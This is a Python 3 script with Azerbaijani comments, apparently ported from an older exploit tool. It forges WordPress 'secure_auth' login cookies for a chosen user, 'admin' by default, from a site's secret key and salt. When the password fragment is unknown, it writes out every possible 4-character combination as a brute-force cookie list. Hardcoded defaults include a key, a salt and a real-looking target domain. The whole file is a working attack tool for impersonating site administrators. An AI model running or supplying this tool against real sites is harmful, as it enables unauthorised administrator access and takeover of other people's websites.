#!/usr/bin/python3
#
##############################################################################
# Title:     WordPress Auth Cookie Generator Demo (Python 3 Version)
# Author:    Original by Mike Czumak | Updated for Python 3
# Purpose:   Generates WP auth cookies (requires valid Secret Key and Salt)
##############################################################################

import hmac, hashlib, sys, getopt

# WP-nin istifadə etdiyi qaydada md5 hash yaradır (Python 3 üçün encode əlavə edilib)
def wp_hash(data, key, salt):
    wpsalt = (key + salt).encode('utf-8')
    data_bytes = data.encode('utf-8')
    hash_res = hmac.new(wpsalt, data_bytes, hashlib.md5).hexdigest()
    return hash_res

# 4 simvoldan ibarət bütün mümkün şifrə fraqmentlərini yaradır
def gen_pass_frag():
    # Character set-ləri düzgün aralıqlarla təyin edirik
    lowerletters = [chr(i) for i in range(ord('a'), ord('z') + 1)]
    upperletters = [chr(i) for i in range(ord('A'), ord('Z') + 1)]
    numbers = [chr(i) for i in range(ord('0'), ord('9') + 1)]
    specchars = ['/', '.']
    allchars = lowerletters + upperletters + numbers + specchars
    
    frag_array = []
    # 4-lük kombinasiyalar (Diqqət: bu proses zaman ala bilər)
    for f1 in allchars:
        for f2 in allchars:
            for f3 in allchars:
                for f4 in allchars:
                    frag_array.append(f1 + f2 + f3 + f4)
    return frag_array

# İstifadəçi üçün cookie-ləri generasiya edir
def gen_cookies(username, expiration, pass_frag, key, salt, target):
    # scheme = 'auth' 
    scheme = 'secure_auth'

    if pass_frag == '':
        print("[*] Bütün kombinasiyalar yaradılır... Bu biraz vaxt apara bilər.")
        frag_array = gen_pass_frag()
    else:
        frag_array = [pass_frag]

    # Target-i hash-ləmək üçün bytes-a çeviririk
    target_hash = hashlib.md5(target.encode('utf-8')).hexdigest()
    cookie_id = 'wordpress_' + target_hash + '='
    allcookies = ''
    i = 0

    for frag in frag_array:
        hashkey = wp_hash(username + frag + '|' + expiration, key, salt)
        # HMAC üçün həm key, həm də message bytes olmalıdır
        hash_val = hmac.new(hashkey.encode('utf-8'), (username + '|' + expiration).encode('utf-8'), hashlib.md5).hexdigest()
        cookie = str(i) + ':' + frag + ':' + cookie_id + username + '%7C' + expiration + '%7C' + hash_val + '\n'
        allcookies += cookie
        i += 1

    print(f'\n[+] Cookie generasiyası tamamlandı. {i} ədəd cookie yaradıldı.')

    if i == 1:
        print('[+] Cookie: ' + allcookies.split(':')[2])
    else:
        filename = target_hash + '_' + username + '_cookies.txt'
        with open(filename, 'w') as f:
            f.write(allcookies)
        print(f'[+] Cookie-lər fayla yazıldı: [{filename}]\n')

def main(argv):
    username = 'admin'
    pass_frag = ''
    expiration = '1577836800'
    key = '?fJ9G+3dhE:StB)i827zq/TI7:>u)3SQ(DNX24Ryg:BXs$n5@pi?_[8|`vm6~9J%'
    salt = '9JewSZcV>/Q^ `Gn1. yg,IWfW:yzPE,..{ZOX2~&.)N7t&C_!NDUT:flB37%$IV'
    target = 'https://www.imagenelabs.com'

    print("\nWordPress Auth Cookie Generator (Python 3)")
    print("Original Author: Mike Czumak (T_v3rn1x)")

    usage = '''\nİstifadə qaydası: python3 cookie.py [seçimlər]
    -u <username>   (default: admin)
    -f <pass_frag>  (boş qalsa bütün kombinasiyaları yoxlayır)
    -e <expiration> (unix_timestamp: default 1/1/2020)
    -k <key>        (Secret Key)
    -s <salt>       (Salt)
    -t <target>     (Target URL: default https://www.imagenelabs.com)'''

    try:
        opts, args = getopt.getopt(argv, 'hu:f:e:k:s:t:')
    except getopt.GetoptError:
        print(usage)
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print(usage)
            sys.exit()
        elif opt == '-u': username = arg
        elif opt == '-f': pass_frag = arg
        elif opt == '-e': expiration = arg
        elif opt == '-k': key = arg
        elif opt == '-s': salt = arg
        elif opt == '-t': target = arg

    gen_cookies(username, expiration, pass_frag, key, salt, target)

if __name__ == '__main__':
    main(sys.argv[1:])
